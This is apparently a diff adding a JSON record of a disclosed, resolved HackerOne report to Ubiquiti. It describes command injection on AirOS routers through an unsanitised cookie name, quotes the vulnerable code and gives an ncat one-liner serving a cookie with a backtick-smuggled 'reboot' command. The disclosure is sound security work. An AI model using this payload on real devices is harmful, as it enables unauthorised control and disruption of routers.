@@ -1,0 +1,134 @@
+{
+  "id": 128750,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjg3NTA=",
+  "url": "https://hackerone.com/reports/128750",
+  "title": "Read-Only user can execute arbitraty shell commands on AirOS",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-04-06T16:54:03.718Z",
+  "submitted_at": "2016-04-06T16:54:03.718Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "rbran",
+    "url": "/rbran",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 800,
+    "url": "https://hackerone.com/ui",
+    "handle": "ui",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Ubiquiti Inc.",
+      "twitter_handle": "ubiquiti",
+      "website": "https://ui.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-08-05T09:36:57.479Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-07-06T09:36:35.716Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "This issue is similar to #119317, but happen on the server side data (actionRemote).\n\nThe function \"parseHeaders\" in remote.inc:38 don't sanitize the input received from the other server (other side of the speed test). If the attacker started an speed test against a controlled server (attacker itself) and returned a cookie with special shell character will be possible to inject commands.\n\nInjection Point:\n```\nFunction parseHeaders $headers\n(\n\tglobal $session_key, $session_value;\n\t$cookie_regex = \"^Set-Cookie: ([AIROS_[:print:]]+)=([[:alnum:]]{32});\";\n\n\t$i = 0;\n\twhile ($i < count($headers)) {\n\t\tif (ereg($cookie_regex, $headers[$i], $regs)) {\n\t\t\t$session_key = $regs[1];  //code injection in this variable\n\t\t\t$session_value = $regs[2];\n\t\t\treturn 0;\n\t\t}\n\t\t$i++;\n\t}\n\treturn $i;\n);\n```\n\nOn doLogin (remote.inc:144, via buildCookieStr), the \"$session_key\" variable is passed to be executed without verification.\n\nremote.inc:146, doLogin():\n```\n\t$session_str = buildCookieStr(); //return the session_key value\n\n\t$cfgfile = \"/tmp/.trigger.txt\";\n\twriteConfig($cfgfile, $login, $passwd);\n\n\t$cmd = $cmd_trigger + $session_str; //now cmd have shell code\n\t$cmd += \" -c $cfgfile\";\n\n\t$url = EscapeShellCmd($base_url + \"/login.cgi\");\n\t$full_cmd = \"$cmd $url\";  //now full_cmd have shell code\n\n\texec($full_cmd, $lines, $res); //shell code executed\n```\n\n#Reproducing the attack:\nFist run the server that will return the cookie: \n```\n$ echo -en \"HTTP/1.1 200 OK\\r\\nSet-Cookie: AIROS_\\`reboot\\`=12345678901234567890123456789012;\\r\\nContent-Length: 1\\r\\nContent-Type: text/html\\r\\n\\r\\nA\" | ncat -l -p 8080\n```\n\nThen execute the speed test against this target.\n\nIn this Exemple: http://192.168.1.100:8080\n\nI Hope you like this report, because I burned my new PicoStation while trying to unbrick it using a ttl cable, after a unsuccessful downgrade :(",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2016-08-05T09:36:35.904Z",
+  "allow_singular_disclosure_after": -237436170.4452342,
+  "singular_disclosure_allowed": true,
+  "vote_count": 20,
+  "voters": [
+    "zoom7",
+    "rbran",
+    "zseano",
+    "jahrek",
+    "vijay_kumar",
+    "harry_mg",
+    "ibram",
+    "dvl",
+    "temmyscript",
+    "craig",
+    "and 10 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 2294,
+      "category": "researcher",
+      "content": "This report is the second of a series of three: #119317, #128750 and #139398.\nThe researcher demonstrates how a read-only user can execute shell commands on a AirOS router, bypassing the solution to #119317.",
+      "user": {
+        "id": 33613,
+        "username": "rbran",
+        "name": "rbran",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://keybase.io/rbran",
+        "location": "",
+        "created_at": "2015-06-11T12:57:30.953Z",
+        "url": "https://hackerone.com/rbran",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    }
+  ]
+}
